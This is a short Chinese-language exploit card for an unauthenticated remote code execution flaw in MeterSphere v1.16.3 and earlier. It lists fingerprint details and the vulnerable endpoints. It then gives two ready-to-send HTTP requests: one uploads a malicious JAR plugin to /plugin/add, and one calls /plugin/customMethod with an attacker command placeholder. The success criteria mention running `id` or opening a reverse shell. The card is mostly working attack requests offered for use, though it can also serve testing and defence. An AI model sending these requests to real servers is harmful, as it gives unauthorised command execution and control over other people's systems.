# MeterSphere 插件 RCE (plugin-rce)

## 指纹特征
- 服务: MeterSphere v1.16.3 及以前
- 端口: 8081
- 关键接口: `/plugin/add` (上传), `/plugin/customMethod` (调用)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 任意文件上传 / 远程代码执行 | `/plugin/add` | 无 |

## PoC 指令

**1. 上传恶意 JAR 插件**
上传包含恶意代码的 `.jar` 插件：

```http
POST /plugin/add HTTP/1.1
Host: {{TARGET}}:8081
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="Evil.jar"

[JAR_BYTES]
------WebKitFormBoundary--
```

**2. 调用恶意方法执行命令**
```http
POST /plugin/customMethod HTTP/1.1
Host: {{TARGET}}:8081
Content-Type: application/json

{
  "entry": "org.vulhub.Evil",
  "request": "{{COMMAND}}"
}
```

## Success Signal
- **状态验证**: 后端成功调用插件入口类并执行命令。
- **物理验证**: 在服务器执行预期操作 (如 `id` 或反弹 Shell)。
